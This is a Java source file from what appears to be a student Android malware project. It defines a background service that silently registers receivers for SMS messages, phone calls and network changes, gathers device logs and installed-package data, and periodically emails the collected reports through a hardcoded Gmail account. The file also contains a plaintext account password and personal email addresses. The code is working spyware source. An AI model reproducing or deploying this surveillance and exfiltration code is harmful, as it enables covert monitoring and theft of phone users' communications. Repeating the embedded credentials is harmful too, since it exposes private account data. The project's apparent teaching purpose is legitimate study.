/***********************************************************************
 * This file is part of INF358-AndroidMalwareProject
 * 
 * Copyright (c) 2012  GPL Project Developer
 * 
 * INF358-AndroidMalwareProject is free software: you may copy, redistribute
 * and/or modify it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 2 of the
 * License, or (at your option) any later version.
 * 
 * This file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

 ***********************************************************************/

package com.malware.service;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;

import com.malware.data.AirplaneReceiver;
import com.malware.data.FetchContentTask;
import com.malware.mail.ConnectionDetector;
import com.malware.mail.ReportSender;
import com.malware.mail.SendMailTask;
import com.malware.mail.WifiReceiver;
import com.malware.phone.IncomingCall;
import com.malware.phone.IncomingSMS;
import com.malware.phone.OutgoingCall;
import com.malware.phone.OutgoingSMS;

public class MyService extends Service {

	private IBinder mBinder;
	private boolean mAllowRebind;
	private ConnectionDetector cd;
	private FetchContentTask fetchContentTask;

	private final boolean VERBOSE = true;
	private final String TAG = "MalwareService";

	/**
	 * Before starting the service, we need to initialize all the
	 * BroadcastReceivers that are used in the program.
	 */
	@Override
	public void onCreate() {
		// Will allow us to check Internet connection before sending email
		cd = new ConnectionDetector(getApplicationContext());

		if (VERBOSE) Log.v(TAG, "Creating service");
		
		// Initialize SMS Sending Broadcast receiver
		IntentFilter outgoingSmsFilter = new IntentFilter("android.intent.action.NEW_OUTGOING_SMS");
		registerReceiver(new OutgoingSMS(this), outgoingSmsFilter);

		// Initialize SMS receiving Broadcast receiver
		IntentFilter incomingSmsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		registerReceiver(new IncomingSMS(this), incomingSmsFilter);
		
		// Initialize outgoing calls Broadcast receiver
		IntentFilter outgoingCallFilter = new IntentFilter(Intent.ACTION_NEW_OUTGOING_CALL);
		registerReceiver(new OutgoingCall(this), outgoingCallFilter);
		
		// Initialize incoming calls Broadcast receiver
		IntentFilter incomingCallFilter = new IntentFilter("android.intent.action.PHONE_STATE");
		registerReceiver(new IncomingCall(this), incomingCallFilter);

		// Initialize Airplane mode Broadcast receiver
		IntentFilter airFilter = new IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED);
		registerReceiver(new AirplaneReceiver(this), airFilter);
		
		// Initialize WiFi Broadcast receiver
		IntentFilter wifiFilter = new IntentFilter(WifiManager.NETWORK_IDS_CHANGED_ACTION);
		wifiFilter.addAction(WifiManager.SUPPLICANT_CONNECTION_CHANGE_ACTION);
		wifiFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
		registerReceiver(new WifiReceiver(this), wifiFilter);	


		Log.v(TAG, "--> Fetching all logs");
		fetchContentTask = new FetchContentTask(this);
		fetchContentTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,getContentResolver(), getPackageManager());

		//		Log.v(TAG, "--> Fetching GPS localisation");
		//		FetchLocalisation gps = new FetchLocalisation(getApplicationContext());
		//		Log.d(TAG, "Latitude = " + gps.getLatitude());
		//		Log.d(TAG, "Longitude = " + gps.getLongitude());

		// initialize the report sender with its frequency
		ReportSender rs = new ReportSender(this, 5000000);
		rs.runTask();

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (VERBOSE) Log.v(TAG, "Starting service");
		
		return Service.START_STICKY;
	}

	/**
	 * Takes a String and adds it to a file located in the folder /data/data/.../files.
	 * Creates the file if necessary or appends textToAdd to it.
	 * 
	 * @param textToAdd 
	 * @param fileName
	 */
	public synchronized void addTextToFile(String textToAdd, String fileName) {
		Date now = new Date();
		try {
			textToAdd = "--> " + now.toString() + ": " + textToAdd + "\n\n";

			// Open file in internal memory
			FileOutputStream output = openFileOutput(fileName, MODE_APPEND);

			// Write the text in the file
			output.write(textToAdd.getBytes());

			output.flush();
			output.close();

		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Checks if an Internet connection is available; if yes, creates an email and sends it.
	 * @param emailSubject
	 * @param emailBody
	 */
	public void sendMail(String emailSubject, String emailBody) {

		if(cd.isConnectingToInternet()) {
			// Gmail address created for the project
			final String fromEmail = "ckahckah@gmail.com";
			final String fromPassword = "projetinf358";

			// Recipients
			String toEmails = "wajihjmaiel@gmail.com";
			List<String> toEmailList = Arrays.asList(toEmails.split("\\s*,\\s*"));

			if (VERBOSE) Log.i(TAG, "To List: " + toEmailList);

			(new SendMailTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, fromEmail,fromPassword, toEmailList, emailSubject, emailBody);
		} else { 
			if (VERBOSE) Log.w(TAG, "No internet connection. Mail can not be sent"); return;
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		// A client is binding to the service with bindService()
		return mBinder;
	}

	@Override
	public boolean onUnbind(Intent intent) {
		// All clients have unbound with unbindService()
		return mAllowRebind;
	}

	@Override
	public void onRebind(Intent intent) {
		// A client is binding to the service with bindService(),
		// after onUnbind() has already been called
	}

	@Override
	public void onDestroy() {
		// The service is no longer used and is being destroyed
		if (VERBOSE) Log.v(TAG, "Destroying service");
//		t.cancel();
	}
}
